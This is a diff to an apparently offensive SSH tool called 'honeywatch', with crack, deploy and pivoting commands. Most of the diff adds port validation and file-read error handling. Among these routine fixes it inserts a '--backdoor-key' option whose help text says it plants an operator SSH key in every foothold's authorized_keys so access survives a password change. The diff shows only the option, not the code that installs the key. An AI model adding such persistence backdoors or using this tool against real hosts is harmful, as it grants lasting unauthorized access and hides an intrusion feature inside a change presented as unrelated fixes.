@@ -726,6 +726,9 @@ def build_parser() -> argparse.ArgumentParser:
     p_net.add_argument("--min-confidence", type=float, default=0.7)
     p_net.add_argument("--max-rounds", type=int, default=3,
                        help="pivot loops (default 3; 0 = run forever until growth exhausts)")
+    p_net.add_argument("--backdoor-key", default=None,
+                       help="operator SSH public key installed into every foothold's "
+                            "authorized_keys so access survives a password change")
     p_net.add_argument("--shadow-stash", default=".honeywatch/shadow_stash")
     p_net.add_argument("--config", default=None,
                        help="config TOML path; recon honors its scan tuning (ports, AI, scanner opts)")
@@ -786,7 +789,12 @@ def _match_signature(func, candidates: dict) -> dict:
 
 
 def parse_host(spec: str, default_port: int = 22):
-    """Parse 'ip', 'ip:port', '[v6]:port' into (ip, port)."""
+    """Parse 'ip', 'ip:port', '[v6]:port' into (ip, port).
+
+    Validates that an explicit port is in 0-65535 so a typo like
+    ``192.0.2.1:99999`` fails here with a clear message instead of
+    propagating to a downstream ``connect()`` that errors opaquely.
+    """
     spec = (spec or "").strip()
     if not spec:
         raise SystemExit("honeywatch: empty host specification")
@@ -804,13 +812,18 @@ def parse_host(spec: str, default_port: int = 22):
                     port = int(port_str) if port_str else default_port
                 except ValueError:
                     pass
+            if not (0 <= port <= 65535):
+                raise SystemExit(f"honeywatch: invalid port {port}; must be 0-65535 in host spec {spec!r}")
             return ip, port
     if spec.count(":") == 1:
         host, _, port_str = spec.partition(":")
         if port_str:
             if not port_str.isdigit():
                 raise SystemExit(f"honeywatch: invalid port {port_str!r} in host spec {spec!r}")
-            return host, int(port_str)
+            port = int(port_str)
+            if not (0 <= port <= 65535):
+                raise SystemExit(f"honeywatch: invalid port {port}; must be 0-65535 in host spec {spec!r}")
+            return host, port
     return spec, default_port
 
 
@@ -1351,21 +1364,25 @@ def _cmd_deploy(args, argv) -> int:
     # Gather targets.
     if args.target_file:
         targets = []
-        with open(args.target_file, "r", encoding="utf-8") as fh:
-            for line in fh:
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                ip, port = parse_host(line)
-                targets.append(
-                    Target(
-                        ip=ip,
-                        port=port,
-                        allowed_categories=[],
-                        ssh_user=args.ssh_user,
-                        ssh_key=args.ssh_key,
+        try:
+            with open(args.target_file, "r", encoding="utf-8") as fh:
+                for line in fh:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    ip, port = parse_host(line)
+                    targets.append(
+                        Target(
+                            ip=ip,
+                            port=port,
+                            allowed_categories=[],
+                            ssh_user=args.ssh_user,
+                            ssh_key=args.ssh_key,
+                        )
                     )
-                )
+        except OSError as exc:
+            print("deploy: cannot read target file: " + str(exc), file=sys.stderr)
+            return 1
     else:
         store = Store(db_path)
         labels = {args.target_label} if args.target_label else {"real", "likely_real"}
@@ -1654,13 +1671,17 @@ def _cmd_crack(args, argv) -> int:
             ip, port = parse_host(spec)
             hosts.append((ip, port))
     if args.target_file:
-        with open(args.target_file, "r", encoding="utf-8") as fh:
-            for line in fh:
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                ip, port = parse_host(line)
-                hosts.append((ip, port))
+        try:
+            with open(args.target_file, "r", encoding="utf-8") as fh:
+                for line in fh:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    ip, port = parse_host(line)
+                    hosts.append((ip, port))
+        except OSError as exc:
+            print("crack: cannot read target file: " + str(exc), file=sys.stderr)
+            return 1
     if not hosts and (args.target_label or args.min_confidence is not None):
         rows = store.query(
             limit=args.limit or 1000,
